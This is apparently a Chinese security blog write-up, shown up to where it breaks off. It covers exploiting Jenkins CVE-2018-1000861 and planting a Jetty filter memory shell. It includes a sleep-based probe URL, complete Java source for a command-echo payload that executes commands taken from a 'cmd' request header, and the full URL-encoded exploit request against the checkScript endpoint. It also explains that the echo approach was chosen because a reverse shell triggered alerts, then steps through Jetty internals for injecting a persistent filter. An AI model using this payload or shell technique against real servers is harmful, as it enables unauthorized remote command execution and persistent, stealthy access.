Jenkins CVE-2018-1000861 内存马注
⼊
Jenkins 介绍
Jenkins是⼀个开源的、提供友好操作界⾯的持续集成(CI)⼯具，在企业中使⽤⾮常⼴泛
相关分析可以看 l1nk3r 师傅的⽂章：https://xz.aliyun.com/t/6361
作者 Orange 分析：https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html
前⾔
 Jenkins 低版本下 (Jenkins  反弹shell触发告警尝试别的⽅法 -> 发现漏洞利⽤为 Groovy 代码执⾏ -> Jetty 回显 -> Jetty 内
存马注⼊ -> Payload 体积过⼤问题 
环境准备
Jenkins 下载：
修改可下任意版本
https://updates.jenkins-ci.org/download/war/2.31/jenkins.war
 https://get.jenkins.io/war/2.302/jenkins.war
下载 war 包之后解压导⼊ IDEA ，然后利⽤如下命令开启远程调试模式，⾄此我们就可以动态调代码了
 java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 
jenkins2.137.war
命令执⾏回显
先不急着内存马注⼊，先尝试解决回显，毕竟回显是内存马的第⼀步，官⽅提供的 war 是可以直接  java -jar 进
⾏启动 
可以看到⾃带的是 Jetty 
通过时间延迟来判断命令是否执⾏:
延时5s 
http://localhost:8080/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.s
c riptsecurity.sandbox.groovy.SecureGroovyScript/checkScript? 
sandbox=true&value=class%20abcd%7Babcd()%7Bsleep(5000)%7D%7D
所以对应的我们就需要 Jetty 的回显链，这⾥直接参考⼤哥们的中间件回显项⽬
feihong师傅：https://github.com/feihong-cs/Java-Rce-Echo/tree/master/Jetty/code
su18师傅：https://github.com/su18/MemoryShell/tree/main/memshell-test/memshell-test-jetty
回显⽐较简单，我们只需要获取请求和响应然后将结果写到 response 中可以了，简单构造了⼀下
回显 Payload 如下：
不过这样全放到 get ⾥⾯体积会⽐较⼤，所以可以针对⼀些空格来压缩⼀下
public class x{
    public x(){
        Class clazz = Thread.currentThread().getClass();
        java.lang.reflect.Field field = clazz.getDeclaredField("threadLocals");
        field.setAccessible(true);
        Object obj = field.get(Thread.currentThread());
        field = obj.getClass().getDeclaredField("table");
        field.setAccessible(true);
        obj = field.get(obj);
        Object[] obj_arr = (Object[]) obj;
        String cmd = "whoami";
        for(int i = 0; i < obj_arr.length; i++){
            Object o = obj_arr[i];
            if(o == null) continue;
            field = o.getClass().getDeclaredField("value");
            field.setAccessible(true);
            obj = field.get(o);
            if(obj != null && 
obj.getClass().getName().endsWith("AsyncHttpConnection")){
                Object connection = obj;
                java.lang.reflect.Method method = 
connection.getClass().getMethod("getRequest", null);
最终回显 Payload 如下（其实 payload 还可以进⼀步压缩：
命令在 header 中添加 cmd:ls 即可
                obj = method.invoke(connection, null);
                method = obj.getClass().getMethod("getHeader", String.class);
                cmd = (String)method.invoke(obj, "cmd");
                if(cmd != null && !cmd.isEmpty()){
                    String res = new 
java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A")
.next();
                    method = connection.getClass().getMethod("getPrintWriter", 
String.class);
                    java.io.PrintWriter printWriter = 
(java.io.PrintWriter)method.invoke(connection, "utf-8");
                    printWriter.println(res);
                }
                break;
            }else if(obj != null && 
obj.getClass().getName().endsWith("HttpConnection")){
                java.lang.reflect.Method method = 
obj.getClass().getDeclaredMethod("getHttpChannel", null);
                Object httpChannel = method.invoke(obj, null);
                method = httpChannel.getClass().getMethod("getRequest", null);
                obj = method.invoke(httpChannel, null);
                method = obj.getClass().getMethod("getHeader", String.class);
                cmd = (String)method.invoke(obj, "cmd");
                if(cmd != null && !cmd.isEmpty()){
                    String res = new 
java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A")
.next();
                    method = httpChannel.getClass().getMethod("getResponse", null);
                    obj = method.invoke(httpChannel, null);
                    method = obj.getClass().getMethod("getWriter", null);
                    java.io.PrintWriter printWriter = 
(java.io.PrintWriter)method.invoke(obj, null);
                    printWriter.println(res);
                }
                break;
            }
        }
    }   
}
实现效果如下：
这样我们就可以不使⽤反弹shell ⽽通过回显payload 将命令结果进⾏显⽰
/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbo
x.groovy.SecureGroovyScript/checkScript?
sandbox=true&value=public%20class%20x%7B%0A%20%20%20%20public%20x()%7BClass%20clazz%20
%3D%20Thread.currentThread().getClass()%3Bjava.lang.reflect.Field%20field%20%3D%20claz
z.getDeclaredField(%22threadLocals%22)%3Bfield.setAccessible(true)%3BObject%20obj%20%3
D%20field.get(Thread.currentThread())%3Bfield%20%3D%20obj.getClass().getDeclaredField(
%22table%22)%3Bfield.setAccessible(true)%3Bobj%20%3D%20field.get(obj)%3BObject%5B%5D%2
0obj_arr%20%3D%20(Object%5B%5D)%20obj%3BString%20cmd%20%3D%20%22whoami%22%3B%0A%20%20%
20%20%20%20%20%20for(int%20i%20%3D%200%3B%20i%20%3C%20obj_arr.length%3B%20i%2B%2B)%7BO
bject%20o%20%3D%20obj_arr%5Bi%5D%3Bif(o%20%3D%3D%20null)%20continue%3Bfield%20%3D%20o.
getClass().getDeclaredField(%22value%22)%3Bfield.setAccessible(true)%3Bobj%20%3D%20fie
ld.get(o)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(obj%20!%3D%20null%20%26%26%20obj
.getClass().getName().endsWith(%22AsyncHttpConnection%22))%7BObject%20connection%20%3D
%20obj%3Bjava.lang.reflect.Method%20method%20%3D%20connection.getClass().getMethod(%22
getRequest%22%2C%20null)%3Bobj%20%3D%20method.invoke(connection%2C%20null)%3Bmethod%20
%3D%20obj.getClass().getMethod(%22getHeader%22%2C%20String.class)%3Bcmd%20%3D%20(Strin
g)method.invoke(obj%2C%20%22cmd%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20
%20if(cmd%20!%3D%20null%20%26%26%20!cmd.isEmpty())%7BString%20res%20%3D%20new%20java.u
til.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(%22%5C%5CA%2
2).next()%3Bmethod%20%3D%20connection.getClass().getMethod(%22getPrintWriter%22%2C%20S
tring.class)%3Bjava.io.PrintWriter%20printWriter%20%3D%20(java.io.PrintWriter)method.i
nvoke(connection%2C%20%22utf-
8%22)%3BprintWriter.println(res)%3B%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20
%20break%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7Delse%20if(obj%20!%3D%20null%20%26
%26%20obj.getClass().getName().endsWith(%22HttpConnection%22))%7Bjava.lang.reflect.Met
hod%20method%20%3D%20obj.getClass().getDeclaredMethod(%22getHttpChannel%22%2C%20null)%
3BObject%20httpChannel%20%3D%20method.invoke(obj%2C%20null)%3Bmethod%20%3D%20httpChann
el.getClass().getMethod(%22getRequest%22%2C%20null)%3Bobj%20%3D%20method.invoke(httpCh
annel%2C%20null)%3Bmethod%20%3D%20obj.getClass().getMethod(%22getHeader%22%2C%20String
.class)%3Bcmd%20%3D%20(String)method.invoke(obj%2C%20%22cmd%22)%3B%0A%20%20%20%20%20%2
0%20%20%20%20%20%20%20%20%20%20if(cmd%20!%3D%20null%20%26%26%20!cmd.isEmpty())%7BStrin
g%20res%20%3D%20new%20java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream(
)).useDelimiter(%22%5C%5CA%22).next()%3Bmethod%20%3D%20httpChannel.getClass().getMetho
d(%22getResponse%22%2C%20null)%3Bobj%20%3D%20method.invoke(httpChannel%2C%20null)%3Bme
thod%20%3D%20obj.getClass().getMethod(%22getWriter%22%2C%20null)%3Bjava.io.PrintWriter
%20printWriter%20%3D%20(java.io.PrintWriter)method.invoke(obj%2C%20null)%3BprintWriter
.println(res)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%
20%20%20%20%20%20%20%20%20%20%20%20break%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%
0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%20%20%20%0A%7D
内存马注⼊
有了回显只能算是中间态，但是想要维持权限却远远不够，回显成功说明了内存马注⼊具有可能性，接下来就是内
存马注⼊的利⽤，这⾥我们就关注 Jetty 的内存马 
在⽹上最多的基本都是 tomcat 的内存马但是如果遇到其他中间件我们如何进⾏编写
这⾥主要来介绍⼀下我⾃⼰编写的⼀个思路
⾸先随便打⼀个断点，但是必须要确保断点处的代码会被运⾏到
我这⾥选择的是 Jenkins 的 JenkinsHttpSessionListener 毕竟 session 的创建和销毁肯定会运⾏到
然后我们就可以看到堆栈情况
这⾥直接关注到  chain.doFilter 这⾥，因为熟悉 Filter 内存马的都知道，最终都是放在⼀个链中的并有着先后顺
序，我们的⽬标就是弄清楚链中放的是什么样的东西，然后我们⾃⼰构造出来给他塞到最前⾯
所以我们就需要先去看 chain 是从哪⾥取出来的
跟进之后发现 chain 是通过 getFilterChain ⽅法来进⾏获取的 
跟进查看发现会遍历 ServletHandler#_filterPathMappings 并调⽤ getFilterHolder 来获取 
FilterMapping#_holder 属性的值，添加到 _filters 中
最后 filters 会作为参数进⼊ Chain 的构造函数 ，最终返回 chain
从上⾯的源码可看出主要进⾏了两个步骤
1. 获取 ServletHandler#_filterPathMappings 并进⾏遍历
2. 获取 FilterMapping#_holder 并添加到 _filters 中
所以 ServletHandler、FilterMapping、FilterHolder 是我们⽬前需要关注的对象
ServletHandler
先来看 ServletHandler，由于我们编写的是 filter 内存马，所以我们就关注和 filter 有关的属性
上⽂说到我们的 chain 是通过调⽤ getFilterChain 来获取 ServletHandler#_filterPathMappings，所以搜索 
_filterPathMappings 来寻找和 _filterPathMappings 有关的⽅法 
我们这⾥关注到 updateMappings ⽅法，因为我们添加 filter 的时候肯定是会修改更新 mapping 所以我们需要知道
更新过程中的⼀些细节
可以看到在更新 mapping 的时候会先从 _filterNameMap 属性中进⾏寻找如果没有找到 filtername 对应的 
FilterHolder 那么就会抛错，然后就是将 filtermapping 添加到 _filterPathMappings 
（最开始编写的时候就是这⾥没注意导致添加失败 - -
同时在  ServletHandler 中还有 prependFilterMapping ⽅法可直接将我们的 filtermap 放到第⼀个
看完 ServletHandler 我们可知晓注册内存马需要以下⼏步：